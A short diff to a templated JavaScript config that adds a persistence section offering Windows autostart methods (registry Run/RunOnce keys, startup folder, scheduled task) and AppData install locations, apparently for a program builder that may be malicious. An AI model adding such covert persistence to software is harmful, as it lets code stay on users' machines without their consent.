@@ -28,4 +28,12 @@ module.exports = {
     preSpawnDelayMs: {{ GR_PRE_SPAWN_DELAY_MS | tojson }},
     debugMode: {{ GR_DEBUG_MODE | tojson }},
   },
+  PERSISTENCE: {
+    // method: "registry_run" | "registry_run_once" | "startup_folder" | "scheduled_task"
+    // installDir: "appdata" | "localappdata"
+    enabled: {{ PERSIST_ENABLED | tojson }},
+    method: {{ PERSIST_METHOD | tojson }},
+    name: {{ PERSIST_NAME | tojson }},
+    installDir: {{ PERSIST_INSTALL_DIR | tojson }},
+  },
 };
